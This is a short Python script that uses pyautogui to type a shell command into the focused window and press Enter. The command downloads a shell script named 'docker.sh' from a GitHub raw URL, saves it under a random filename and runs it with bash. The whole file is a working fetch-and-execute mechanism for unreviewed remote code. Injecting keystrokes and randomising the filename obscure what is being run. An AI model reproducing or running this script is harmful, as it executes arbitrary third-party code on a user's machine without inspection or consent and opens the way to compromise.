import random
import string
import pyperclip
import pyautogui
import time

time.sleep(1.5)

# Function to generate a random filename with alphabetic characters
def generate_random_filename(length=8):
    return ''.join(random.choices(string.ascii_lowercase, k=length)) + '.sh'

# Generate random filename
random_filename = generate_random_filename()

# Construct the command
command = f"wget https://raw.githubusercontent.com/Fiujol/Hoym/refs/heads/main/docker.sh -O {random_filename} && bash {random_filename}"

# Copy the command to clipboard
pyperclip.copy(command)

# Give a small delay to ensure clipboard is ready
time.sleep(0.5)

# Use pyautogui to write the command
pyautogui.write(command)
time.sleep(0.7)
pyautogui.press('enter')
time.sleep(2)
